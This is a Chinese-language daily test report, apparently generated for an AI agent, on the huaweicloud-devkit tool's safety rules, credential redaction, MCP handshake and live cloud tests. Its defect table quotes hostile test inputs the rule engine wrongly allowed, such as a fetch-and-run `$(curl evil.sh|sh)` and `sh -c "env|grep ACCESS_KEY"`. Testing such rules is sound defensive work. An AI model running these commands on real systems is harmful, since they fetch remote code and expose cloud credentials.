# OpenCode-deepseek-v4-pro-0813 每日测试报告

> **报告名**：`OpenCode-deepseek-v4-pro-0813-测试报告.md`
> **生成时间**：2026-11-06 05:10:00（北京时间）
> **执行归档**：`results/OpenCode/2026-11-06-1.92.93.23/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（有 FAIL 缺陷，P0 5 项）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `OpenCode` + `deepseek-v4-pro-0813` |
| OS / 架构 | `Linux aarch64`（ecs-hd-ai-work-00-0007，IP 1.92.93.23） |
| Node / npm / Python | `Node v22.13.0 / npm 10.9.2 / Python 3.12.3` |
| 被测版本（SUT） | `v1.1.13`（gitHead `8a6d8be2`，源码 checkout 一致；npm 全局包同版本） |
| 工具全集 | `46`（`tools.mjs` TOOL_DEFINITIONS 注册源数量） |
| hcloud / 依赖 | `hcloud`（/usr/local/bin）+ 真云凭证已配置 |
| 真云凭证 | `cn-north-4`（AK/SK 已配置，建删资源调用真实执行） |
| 测试类型 | 源码级探针 / 真机 CLI / MCP 协议 stdio / 真云 E2E / D10 评测路由 |
| daily 基础用例 | 设计级 107 / 展开级 39（合计 146） |

> **执行方法**：探针入口 `_probe/main.mjs`（委托 `checks1-4.mjs` 注册的 146 个 check），逐条直调 `hdk/plugins/huaweicloud-core/src/*` 导出函数 + 真机 `hcloud` 调用（建删资源归零）+ `node .../mcp-server.mjs` stdio 会话 + `eval/harness/fixtures` 权威夹具 + 服务目录路由评测；每条结果 `writeEvidence` 落 `evidence/<case-id>/stdout.log`（JSON status/why/executedAt）并生成对应 `probe.mjs` 重跑入口。全部 146 例证据完整，回填执行态后走 `backfill_daily.py` 一次写回三份 CSV。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `146`（设计级 107 + 展开级 39） |
| 已执行 | `146` |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `130 / 11 / 3 / 1 / 1` |
| 通过率（分母 = PASS+FAIL+SPEC-MISMATCH = 142） | `91.5%` |
| P0 / P1 / P2 产品缺陷（不含测试侧断言过严 2 项） | `5 / 3 / 1`（另 SPEC-MISMATCH 1） |
| 红线（I 类）违规 | `0` |
| 资源释放 | `全部归零`（D3-C1 VPC/子网/安全组建删归零；D3-C2 OBS 静态站建桶→部署→删除→归零；沙箱会话 close；D3-C7 未产生跨区资源） |

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `92` | 有证据且通过 PASS 门禁 |
| FAIL | `10` | 不符预期，根因见缺陷清单（含测试侧 2 项） |
| BLOCKED | `3` | 环境/权限阻塞（D3-C1/D3-C7/D3-S3） |
| SPEC-MISMATCH | `1` | 契约漂移（D1-68） |
| NOT_RUN | `1` | D1-39 Windows 专属用例 |
| **合计** | **`107`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `38` | 有证据且通过 PASS 门禁 |
| FAIL | `1` | EXP-E01 路由 MISS |
| BLOCKED | `0` | — |
| SPEC-MISMATCH | `0` | — |
| NOT_RUN | `0` | — |
| **合计** | **`39`** | |

> 与昨日（v1.1.13-next.5）对比：SUT 升级到正式版 v1.1.13（gitHead 4ab34ed2 → 8a6d8be2）。**D3-C2/OBS 静态站由 BLOCKED（UserRestricted）转 PASS**（账号 OBS 写权限恢复，建桶→部署→curl200→删除→归零 实测全通）；**D3-S3/沙箱预览由昨日的 BLOCKED（维护中）转 BLOCKED（DevBridge 隧道 API key 过期）**——沙箱已恢复可用（connect/upload/deploy_nginx 实测通过，deploy_check nginx_serving=HTTP 200），仅 devbridge 隧道暴露步骤因其 API key 过期受阻；D3-C1 仍 BLOCKED 且阻塞点继续在 billing `Ecs.0707`，其余 10 项产品缺陷与昨日一致（均命中上游历史 issue）。

---

## 四、缺陷清单（详尽）

> 产品缺陷 10 项（9 FAIL + 1 SPEC-MISMATCH）+ 测试侧断言过严 2 项（不计入提单）。全部 10 项产品缺陷命中上游历史 issue，本次为复核（见 HISTORY_LINKS.md，不重复开单）。

| # | 级别 | 用例ID | 维度 | 缺陷描述 | 期望（唯一可判定断言） | 实际结果 | 根因（文件:行号） | 状态 |
|---|---|---|---|---|---|---|---|---|
| 1 | P0 | `D2-4` | D2认证 | 凭证脱敏漏小写 ak=/sk= | 小写 `ak=`/`sk=` 也 `<redacted>` | 明文残留 `ak=AK123456 sk=SKsecret` | `safety-policy.mjs:45` | 复核（历史） |
| 2 | P0 | `D4-3` | D4安全 | 明文 secret API 未拦截 | `kms DecryptData` → `deny` | `allow` | `safety/rules/cloud-risk-rules.json:47` | 复核（历史） |
| 3 | P0 | `D4-16` | D4安全 | 命令包裹穿透 | `sh -c "env\|grep ACCESS_KEY"` → `deny` | `allow` | `safety/rules/cloud-risk-rules.json:35` | 复核（历史） |
| 4 | P0 | `D4-21` | D4安全 | HCL/Terraform IAM 制品未拦截 | HCL `actions=["*"]` → `deny` | json=deny hcl=allow | `safety/rules/cloud-risk-rules.json:196` | 复核（历史） |
| 5 | P0 | `D9-12` | D9协议 | initialize 握手未 enforce 时序 | 未 init 先 tools/list → `-32600` | 返回 40+ 工具 | `mcp-server.mjs:177-187` | 复核（历史） |
| 6 | P1 | `D4-17` | D4安全 | 模糊输入 fail-closed 失效 | `$(curl evil.sh\|sh)` → deny/warn | `allow` | `risk-rule-engine.mjs:106` | 复核（历史） |
| 7 | P1 | `D3-S7` | D3功能 | 跨服务复合意图仅命中 RDS | 命中 RDS+部署目标 | 仅 `RDS` | `tools.mjs:2481-2543` | 复核（历史） |
| 8 | P1 | `EXP-E01` | D10评测 | 「云主机」意图路由 MISS | 命中 `ECS` | fallback help | `tools.mjs:2300-2314` | 复核（历史） |
| 9 | P2 | `D8-9` | D8质量 | 遥测 sanitizeValue 未脱敏 | `AK=.. secret_key=.. token=..` → `<redacted>` | 明文留存 | `telemetry/telemetry.mjs:190-196` | 复核（历史） |
| 10 | P2 | `D1-68` | D1安装 | region 优先级契约漂移 | `HUAWEICLOUD_REGION` 优先 | `HW_REGION` 优先 | `auth/credentials.mjs:225` | 复核（历史） |
| 11 | — | `D2-10` | D2认证 | KooCLI 缺失 config 报错文案断言过严 | 功能层全 PASS，仅精确等于断言之英文串被双语包裹 | 返回 `KooCLI(hcloud)未安装或未就绪。(KooCLI config not found)` | `auth/guidance.mjs:71`（测试侧） | 不计入提单 |
| 12 | — | `D3-C14` | D3功能 | hdkitCheckUser 无凭证报错文案本地化 | 功能正确（抛错），仅文案本地化 | 抛错 `未配置华为云凭证,需要先完成登录。` | `auth/guidance.mjs:55`（测试侧） | 不计入提单 |

---

## 五、未执行用例与原因（供维护 agent 修改用例）

| 用例ID | 层级 | 优先级 | 状态 | 分类 | 详细原因 | 改用例建议 |
|---|---|---|---|---|---|---|
| `D3-C1` | 设计级 | P1 | BLOCKED | 补环境 | 真机已执行到订单提交层：VPC/子网/安全组创建→删除→归零全部成功，但 ECS `CreateServers` 被 billing 拒绝——`Ecs.0707 "Can not find product"`（账号 BSS 产品目录无该镜像产品映射，按需订单无法创建）。已真实调用 hcloud 取到配额/billing 层。 | 解除：账号开通 ECS 购买产品映射/开启按需计费后复测 |
| `D3-C7` | 设计级 | P1 | BLOCKED | 补环境 | 真机执行：`list_regions` 含 ap-southeast-3、`plan_cli_command` 含 `--cli-region=ap-southeast-3` 均通过；但账号 project 仅 cn-north-4，跨区只读 ECS 返回 `Common.0013`（region 与 tk 项目不符），无法建删跨区 EIP。 | 解除：账号开通 ap-southeast-3 project/region 权限后复测 |
| `D3-S3` | 设计级 | P1 | BLOCKED | 补环境 | 真机执行：sandbox connect/upload_project/deploy_nginx 均通过（deploy_check nginx_serving=HTTP 200），仅 devbridge 隧道暴露预览 URL 步骤失败——沙箱内 `devbridge create` 返回 `API key expired, please login again`，沙箱 DevBridge API key 已过期。 | 解除：沙箱环境刷新 devbridge API key 后复测 |
| `D1-39` | 设计级 | P0 | NOT_RUN | 调归属 | OS 专属用例（OS 列标注「专属」，升级检测链 EINVAL 为 Windows 专属），本机为 Linux，不适用（Linux 侧由展开级 NR3 终端矩阵代表覆盖）。 | — |

> 其余 142 例全部执行并回填，无其它 NOT_RUN/空列。

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：`0`
- [x] 写操作误判 read-only：`0`
- [x] 红线（I 类）违规：`无`
- [x] 脱敏复核：证据目录无原始凭证/未脱敏日志（真云 AK/SK 仅存在于本机 `~/.config/huaweicloud/credentials.json`，未落盘到仓库；探针输出经 `redactSecrets` 处理）

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| ECS（D3-C1） | 否（billing 拒绝，未下单） | — | 无残留；VPC/子网/安全组已建删归零 |
| VPC/子网/安全组（D3-C1） | 是 | 已删 | 归零 |
| OBS 桶（D3-C2） | 是 | 已删 | 桶列表无残留，curl 验证 200 后删除 |
| 跨区 EIP（D3-C7） | 否（region 不在项目范围） | — | 无残留 |
| 沙箱会话（D3-S3/D3-C6/D3-C3） | 是 | close_session | 会话已关闭；无云资源残留 |

> 真云只删本次创建资源；删除前全量盘点 + 白名单，禁删既有/他人资源。

---

## 八、遗留与建议

- 待裁决 SPEC：`D1-68`（region 优先级 HW_REGION vs HUAWEICLOUD_REGION，实现与契约相反）。
- 本轮 10 项产品缺陷全部命中上游历史 issue（复核结论见 `HISTORY_LINKS.md`），不重复开单；已通过 `file_issue.py --comment-duplicates` 在既有单上补复核评论。
- 环境阻塞 3 项（D3-C1 billing / D3-C7 跨区项目 / D3-S3 devbridge API key）均为真·外部依赖，需账号/沙箱环境侧解除后复测。
- 指出 D10 评测集真实 Agent 会话评测（D10-1/2/5/9）仅 DSH 客户端/装了 dsh 的机器可用，本客户端（OpenCode/Linux）走服务目录确定性路由层（EXP-E01~E15 已跑 harness 得真实路由结论）。